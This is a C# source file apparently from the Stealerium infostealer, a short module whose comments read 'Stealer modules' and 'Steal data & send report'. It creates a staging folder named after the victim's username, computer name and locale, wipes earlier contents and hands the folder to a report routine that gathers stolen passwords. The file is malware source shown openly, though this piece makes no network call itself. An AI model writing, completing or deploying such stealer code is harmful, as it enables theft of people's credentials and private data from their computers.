using System;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Target
{
    internal sealed class Passwords
    {
        // Stealer modules
        private static readonly string PasswordsStoreDirectory = Path.Combine(
            Paths.InitWorkDir(),
            SystemInfo.Username + "@" + SystemInfo.Compname + "_" + SystemInfo.Culture);

        // Steal data & send report
        public static string Save()
        {
            
            try
            {
                Logging.Log("Removing Old Data>> Started!\n");
                Filemanager.RecursiveDelete(PasswordsStoreDirectory);
                Logging.Log("Removing Old Data>> Ended!\n");
            }
            catch
            {
                Logging.Log("Stealer >> Failed recursive remove directory with passwords");
            }
            if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
            return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : "";
        }
    }
}